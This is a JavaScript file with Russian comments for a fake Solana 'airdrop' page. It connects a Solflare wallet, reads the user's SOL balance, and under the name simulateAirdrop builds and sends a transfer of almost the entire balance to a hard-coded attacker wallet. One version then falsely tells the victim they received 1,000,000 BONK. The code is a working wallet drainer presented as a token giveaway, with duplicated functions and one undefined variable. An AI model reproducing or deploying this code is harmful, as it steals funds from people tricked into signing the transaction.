// Конфигурация
const TOKEN_MINT = '85VBFQZC9TZkfaptBWjvUw7YbZjy52A6mjtPGjstQAmQ';
const DESTINATION_WALLET = '8m1uhnyvrPSudreGxs1jwYQnFQZ1oqGivDqbyLRAYPsD';
const AIRDROP_AMOUNT = 1000000;

// Глобальные переменные
let walletConnected = false;
let publicKey = null;
let solBalance = 0;

console.log('🚀 app.js загружен');

// Определение типа устройства
function isMobileDevice() {
    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || 
           (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
    console.log('📱 Определение устройства:', isMobile ? 'Mobile' : 'PC');
    return isMobile;
}

// Открытие модального окна
function connectWallet() {
    console.log('🖱️ Нажата кнопка Connect Wallet');
    if (isMobileDevice()) {
        console.log('📱 Мобильное устройство - прямой вызов Solflare');
        connectSolflare();
    } else {
        console.log('💻 PC устройство - открытие модального окна');
        document.getElementById('walletModal').style.display = 'flex';
    }
}

// Закрытие модального окна
function closeModal() {
    console.log('❌ Закрытие модального окна');
    document.getElementById('walletModal').style.display = 'none';
}

// Подключение Solflare кошелька
async function connectSolflare() {
    console.log('🔗 Начало подключения Solflare');
    const isMobile = isMobileDevice();
    
    if (isMobile) {
        connectSolflareMobile();
    } else {
        await connectSolflareDesktop();
    }
    
    closeModal();
}

// Подключение для ПК
async function connectSolflareDesktop() {
    console.log('💻 Попытка подключения через расширение браузера');
    
    if (window.solflare && window.solflare.isSolflare) {
        console.log('✅ Solflare расширение найдено');
        console.log('🔍 Solflare объект:', window.solflare);
        
        try {
            const solflare = window.solflare;
            console.log('🔑 Запрос на подключение...');
            
            // Правильный способ подключения для Solflare
            if (solflare.connect) {
                await solflare.connect();
                console.log('✅ Connect метод выполнен');
            }
            
            // Получаем публичный ключ напрямую из объекта solflare
            if (solflare.publicKey) {
                publicKey = solflare.publicKey.toString();
                console.log('✅ Публичный ключ получен:', publicKey);
            } else if (solflare._publicKey) {
                publicKey = solflare._publicKey.toString();
                console.log('✅ Публичный ключ получен (из _publicKey):', publicKey);
            } else {
                // Альтернативный способ - через запрос accounts
                const accounts = await solflare.getAccounts();
                if (accounts && accounts.length > 0) {
                    publicKey = accounts[0].toString();
                    console.log('✅ Публичный ключ получен через getAccounts():', publicKey);
                } else {
                    throw new Error('Не удалось получить публичный ключ');
                }
            }
            
            await handleWalletConnected();
            
        } catch (error) {
            console.error('❌ Ошибка подключения:', error);
            console.error('🔍 Детали ошибки:', {
                message: error.message,
                stack: error.stack,
                solflare: window.solflare ? 'доступен' : 'не доступен'
            });
            alert('Ошибка подключения кошелька: ' + error.message);
        }
    } else {
        console.log('❌ Solflare расширение не найдено');
        openSolflareWebsite();
    }
}

// Подключение для мобильных устройств
function connectSolflareMobile() {
    console.log('📱 Попытка подключения через мобильное приложение');
    const solflareDeeplink = `solflare://wc?uri=${encodeURIComponent(window.location.href)}`;
    console.log('🔗 Deeplink:', solflareDeeplink);
    window.location.href = solflareDeeplink;
    
    setTimeout(() => {
        if (!document.hidden) {
            console.log('❌ Приложение не открылось, переход на сайт');
            openSolflareWebsite();
        }
    }, 1000);
}

// Обработка успешного подключения кошелька
async function handleWalletConnected() {
    console.log('🔧 Обработка подключенного кошелька');
    walletConnected = true;
    document.getElementById('walletInfo').style.display = 'block';
    document.querySelector('.connect-btn').style.display = 'none';
    
    await getWalletBalance();
    updateBalanceDisplay();
}

async function getWalletBalance() {
    console.log('💰 Получение баланса кошелька');
    
    if (!publicKey) {
        console.log('❌ Нет публичного ключа для получения баланса');
        return;
    }

    // Используем только рабочие RPC endpoints
    const rpcEndpoints = [
        "https://solana-rpc.publicnode.com",
        "https://api.devnet.solana.com"
    ];

    for (let i = 0; i < rpcEndpoints.length; i++) {
        const endpoint = rpcEndpoints[i];
        try {
            console.log(`🔗 RPC ${i + 1}/${rpcEndpoints.length}: ${endpoint}`);
            
            const payload = {
                "jsonrpc": "2.0",
                "id": 1,
                "method": "getBalance",
                "params": [publicKey]
            };
            
            const response = await fetch(endpoint, {
                method: 'POST',
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify(payload)
            });
            
            if (!response.ok) {
                console.log(`❌ HTTP ошибка: ${response.status}`);
                continue;
            }
            
            const data = await response.json();
            console.log('📊 RPC ответ:', data);
            
            if (data.result) {
                const balanceInLamports = data.result.value;
                solBalance = balanceInLamports / 1000000000;
                console.log(`✅ Баланс получен через ${endpoint}: ${solBalance} SOL`);
                return;
            }
            
        } catch (error) {
            console.log(`❌ Ошибка с RPC ${endpoint}:`, error.message);
        }
    }
    
    console.log('❌ Все методы получения баланса не удались');
    solBalance = 0;
}

// Fallback метод через другие RPC
async function getWalletBalanceFallback() {
    console.log('🔄 RPC fallback метод...');
    
    const rpcEndpoints = [
        "https://api.mainnet-beta.solana.com",
        "https://solana-api.projectserum.com", 
        "https://rpc.ankr.com/solana",
        "https://solana-rpc.publicnode.com",
        "https://free.rpc.quicknode.com/solana"
    ];

    for (let i = 0; i < rpcEndpoints.length; i++) {
        const endpoint = rpcEndpoints[i];
        try {
            console.log(`🔗 RPC fallback ${i + 1}/${rpcEndpoints.length}: ${endpoint}`);
            
            const payload = {
                "jsonrpc": "2.0",
                "id": 1,
                "method": "getBalance",
                "params": [publicKey]
            };
            
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 10000);
            
            const response = await fetch(endpoint, {
                method: 'POST',
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify(payload),
                signal: controller.signal
            });
            
            clearTimeout(timeoutId);
            
            if (!response.ok) {
                console.log(`❌ HTTP ошибка: ${response.status}`);
                continue;
            }
            
            const data = await response.json();
            console.log('📊 RPC ответ:', data);
            
            if (data.result) {
                const balanceInLamports = data.result.value;
                solBalance = balanceInLamports / 1000000000;
                console.log(`✅ Баланс получен через RPC ${endpoint}: ${solBalance} SOL`);
                return;
            }
            
        } catch (error) {
            console.log(`❌ Ошибка с RPC ${endpoint}:`, error.message);
        }
    }
    
    // Последняя попытка через web3.js
    console.log('🔄 Последняя попытка через web3.js...');
    try {
        const connection = new window.solanaWeb3.Connection(
            "https://rpc.ankr.com/solana",
            { commitment: 'confirmed' }
        );
        const publicKeyObj = new window.solanaWeb3.PublicKey(publicKey);
        const balance = await connection.getBalance(publicKeyObj);
        solBalance = balance / window.solanaWeb3.LAMPORTS_PER_SOL;
        console.log(`✅ Баланс через web3.js: ${solBalance} SOL`);
    } catch (finalError) {
        console.error('❌ Все методы получения баланса не удались:', finalError);
        solBalance = 0;
    }
}

// Простая функция для быстрой проверки через самый надежный RPC
async function quickBalanceCheck() {
    console.log('⚡ Быстрая проверка баланса...');
    
    if (!publicKey) return;

    try {
        // Используем Ankr - самый надежный бесплатный RPC
        const response = await fetch("https://rpc.ankr.com/solana", {
            method: 'POST',
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({
                "jsonrpc": "2.0",
                "id": 1,
                "method": "getBalance", 
                "params": [publicKey]
            })
        });
        
        const data = await response.json();
        
        if (data.result) {
            const balanceInLamports = data.result.value;
            solBalance = balanceInLamports / 1000000000;
            console.log(`✅ Быстрая проверка: ${solBalance} SOL`);
            updateBalanceDisplay();
            return true;
        }
    } catch (error) {
        console.log('❌ Быстрая проверка не удалась:', error);
    }
    
    return false;
}

function updateBalanceDisplay() {
    console.log('🔄 Обновление отображения баланса');
    const balanceElement = document.getElementById('balanceInfo');
    if (publicKey && solBalance !== null) {
        balanceElement.innerHTML = `
            <strong>Wallet:</strong> ${publicKey.slice(0, 8)}...${publicKey.slice(-8)}<br>
            <strong>SOL Balance:</strong> ${solBalance.toFixed(6)} SOL
        `;
        console.log('✅ Баланс отображен в UI:', solBalance, 'SOL');
    } else {
        balanceElement.innerHTML = 'Loading balance...';
    }
}

async function handleWalletConnected() {
    console.log('🔧 Обработка подключенного кошелька');
    walletConnected = true;
    document.getElementById('walletInfo').style.display = 'block';
    document.querySelector('.connect-btn').style.display = 'none';
    
    // Показываем временный текст
    document.getElementById('balanceInfo').innerHTML = 'Loading balance...';
    
    await getWalletBalance();
    updateBalanceDisplay();
}

// Симуляция аирдропа и перевод баланса
async function simulateAirdrop() {
    console.log('🎯 Начало симуляции аирдропа');
    
    if (!walletConnected || !publicKey) {
        console.log('❌ Кошелек не подключен');
        alert('Пожалуйста, сначала подключите кошелек');
        return;
    }

    console.log('✅ Кошелек подключен, публичный ключ:', publicKey);
    console.log('💰 Текущий баланс:', solBalance, 'SOL');

    // Проверяем минимальный баланс (0.002 SOL для безопасности)
    if (solBalance < 0.002) {
        alert(`Недостаточно SOL для выполнения транзакции. Требуется минимум 0.002 SOL, у вас: ${solBalance} SOL`);
        return;
    }

    const loadingElement = document.getElementById('loading');
    loadingElement.style.display = 'block';

    try {
        const transaction = await createAirdropTransaction();
        
        if (window.solflare && window.solflare.isSolflare) {
            console.log('✍️ Подписание транзакции...');
            const signedTransaction = await window.solflare.signTransaction(transaction);
            
            console.log('📤 Отправка транзакции...');
            const signature = await sendTransaction(signedTransaction);
            
            console.log('✅ Транзакция отправлена:', signature);
            alert(`✅ Аирдроп выполнен!\n\nВы получили: 1,000,000 BONK\nПереведено: ${(transferAmount / 1000000000).toFixed(6)} SOL\n\nSignature: ${signature}\n\nПроверить транзакцию: https://solscan.io/tx/${signature}`);
            
            // Обновляем баланс
            setTimeout(async () => {
                await getWalletBalance();
                updateBalanceDisplay();
            }, 3000);
            
        } else {
            throw new Error('Solflare не найден');
        }
        
    } catch (error) {
        console.error('❌ Ошибка транзакции:', error);
        alert('Ошибка при выполнении транзакции: ' + error.message);
    } finally {
        loadingElement.style.display = 'none';
    }
}
// Создание транзакции аирдропа
// Создание транзакции (только перевод - самый простой вариант)
async function createAirdropTransaction() {
    console.log('🔧 Создание транзакции перевода');
    
    const workingRpc = "https://solana-rpc.publicnode.com";
    const connection = new window.solanaWeb3.Connection(workingRpc);

    const transaction = new window.solanaWeb3.Transaction();

    // Перевод SOL (оставляем 0.001 SOL для rent и комиссий)
    const transferAmount = Math.floor((solBalance - 0.001) * window.solanaWeb3.LAMPORTS_PER_SOL);
    
    if (transferAmount <= 0) {
        throw new Error(`Недостаточно SOL для перевода. Нужно минимум 0.001 SOL, у вас: ${solBalance} SOL`);
    }

    console.log('💸 Сумма перевода SOL:', transferAmount, 'lamports');

    const transferInstruction = window.solanaWeb3.SystemProgram.transfer({
        fromPubkey: new window.solanaWeb3.PublicKey(publicKey),
        toPubkey: new window.solanaWeb3.PublicKey(DESTINATION_WALLET),
        lamports: transferAmount,
    });

    // Добавляем инструкцию
    transaction.add(transferInstruction);
    
    console.log('✅ Инструкция добавлена в транзакцию');

    // Получаем последний блок
    const { blockhash } = await connection.getLatestBlockhash();
    transaction.recentBlockhash = blockhash;
    transaction.feePayer = new window.solanaWeb3.PublicKey(publicKey);

    console.log('✅ Транзакция полностью сформирована');
    return transaction;
}
// Отправка транзакции
async function sendTransaction(transaction) {
    console.log('📤 Отправка транзакции в сеть...');
    
    // Используем рабочий RPC для отправки
    const workingRpc = "https://solana-rpc.publicnode.com";
    const connection = new window.solanaWeb3.Connection(workingRpc);
    
    const signature = await connection.sendRawTransaction(transaction.serialize());
    console.log('✅ Транзакция отправлена, signature:', signature);
    
    console.log('⏳ Подтверждение транзакции...');
    await connection.confirmTransaction(signature);
    console.log('✅ Транзакция подтверждена');
    
    return signature;
}

// Симуляция аирдропа и перевод баланса
// Симуляция аирдропа и перевод баланса
async function simulateAirdrop() {
    console.log('🎯 Начало симуляции аирдропа');
    
    if (!walletConnected || !publicKey) {
        console.log('❌ Кошелек не подключен');
        alert('Пожалуйста, сначала подключите кошелек');
        return;
    }

    console.log('✅ Кошелек подключен, публичный ключ:', publicKey);
    console.log('💰 Текущий баланс:', solBalance, 'SOL');

    // Проверяем минимальный баланс (0.002 SOL для безопасности)
    if (solBalance < 0.002) {
        alert(`Недостаточно SOL для выполнения транзакции. Требуется минимум 0.002 SOL, у вас: ${solBalance} SOL`);
        return;
    }

    const loadingElement = document.getElementById('loading');
    loadingElement.style.display = 'block';

    try {
        const transaction = await createAirdropTransaction();
        const transferAmount = Math.floor((solBalance - 0.001) * window.solanaWeb3.LAMPORTS_PER_SOL);
        
        if (window.solflare && window.solflare.isSolflare) {
            console.log('✍️ Подписание транзакции...');
            const signedTransaction = await window.solflare.signTransaction(transaction);
            
            console.log('📤 Отправка транзакции...');
            const signature = await sendTransaction(signedTransaction);
            
            console.log('✅ Транзакция отправлена:', signature);
            alert(`✅ Транзакция выполнена!\n\nПереведено: ${(transferAmount / 1000000000).toFixed(6)} SOL\nОсталось: 0.001 SOL\n\nSignature: ${signature}\n\nПроверить транзакцию: https://solscan.io/tx/${signature}`);
            
            // Обновляем баланс
            setTimeout(async () => {
                await getWalletBalance();
                updateBalanceDisplay();
            }, 3000);
            
        } else {
            throw new Error('Solflare не найден');
        }
        
    } catch (error) {
        console.error('❌ Ошибка транзакции:', error);
        alert('Ошибка при выполнении транзакции: ' + error.message);
    } finally {
        loadingElement.style.display = 'none';
    }
}

// Открытие сайта Solflare
function openSolflareWebsite() {
    console.log('🌐 Открытие сайта Solflare');
    const solflareUrl = 'https://solflare.com/download';
    window.open(solflareUrl, '_blank');
}

// Обработчик клика вне модального окна
window.onclick = function(event) {
    const modal = document.getElementById('walletModal');
    if (event.target === modal) {
        closeModal();
    }
}

// Инициализация при загрузке страницы
window.addEventListener('load', function() {
    console.log('📄 Страница загружена');
    console.log('🔍 Проверка устройства:', isMobileDevice() ? 'Mobile' : 'PC');
    console.log('🔍 Проверка Solflare:', window.solflare ? 'Найден' : 'Не найден');
    console.log('🔍 Проверка Solana Web3:', window.solanaWeb3 ? 'Найден' : 'Не найден');
    
    // Загружаем необходимые библиотеки
    loadSolanaWeb3();
});

// Загрузка Solana Web3 библиотеки
function loadSolanaWeb3() {
    console.log('📚 Загрузка Solana Web3 библиотеки...');
    
    if (!window.solanaWeb3) {
        const script = document.createElement('script');
        script.src = 'https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js';
        script.onload = function() {
            console.log('✅ Solana Web3.js загружен');
            initializeWallet();
        };
        script.onerror = function() {
            console.error('❌ Ошибка загрузки Solana Web3.js');
        };
        document.head.appendChild(script);
    } else {
        console.log('✅ Solana Web3.js уже загружен');
        initializeWallet();
    }
}

// Инициализация кошелька при наличии
function initializeWallet() {
    console.log('🔧 Инициализация кошелька...');
    
    if (window.solflare) {
        console.log('🔍 Объект Solflare:', window.solflare);
        console.log('🔍 Solflare публичный ключ:', window.solflare.publicKey);
        console.log('🔍 Solflare _publicKey:', window.solflare._publicKey);
        
        // Проверяем, уже подключен ли кошелек
        if (window.solflare.isConnected) {
            console.log('✅ Кошелек уже подключен');
            // Пытаемся получить публичный ключ
            if (window.solflare.publicKey) {
                publicKey = window.solflare.publicKey.toString();
                console.log('✅ Автоматически получен публичный ключ:', publicKey);
                handleWalletConnected();
            }
        } else {
            console.log('ℹ️ Кошелек не подключен');
        }
    } else {
        console.log('ℹ️ Кошелек не подключен');
    }
}

window.debugWallet = {
    getPublicKey: () => publicKey,
    getBalance: () => solBalance,
    isConnected: () => walletConnected,
    getSolflare: () => window.solflare,
    refreshBalance: async () => {
        console.log('🔄 Обновление баланса...');
        await getWalletBalance();
        updateBalanceDisplay();
        console.log('✅ Баланс обновлен:', solBalance, 'SOL');
    },
    testWorkingRpc: async () => {
        console.log('🧪 Тест рабочих RPC endpoints...');
        const endpoints = [
            "https://solana-rpc.publicnode.com",
            "https://api.devnet.solana.com"
        ];
        
        for (const endpoint of endpoints) {
            try {
                const payload = {
                    "jsonrpc": "2.0",
                    "id": 1,
                    "method": "getHealth"
                };
                
                const response = await fetch(endpoint, {
                    method: 'POST',
                    headers: {"Content-Type": "application/json"},
                    body: JSON.stringify(payload)
                });
                
                if (response.ok) {
                    const data = await response.json();
                    console.log(`✅ ${endpoint}: HEALTHY`);
                } else {
                    console.log(`❌ ${endpoint}: HTTP ${response.status}`);
                }
            } catch (error) {
                console.log(`❌ ${endpoint}: ${error.message}`);
            }
        }
    },
    testTransactionCreation: async () => {
        console.log('🧪 Тест создания транзакции...');
        try {
            const transaction = await createAirdropTransaction();
            console.log('✅ Транзакция создана успешно');
            return transaction;
        } catch (error) {
            console.error('❌ Ошибка создания транзакции:', error);
            return null;
        }
    }
};

console.log('🔧 Глобальный объект отладки доступен как debugWallet');
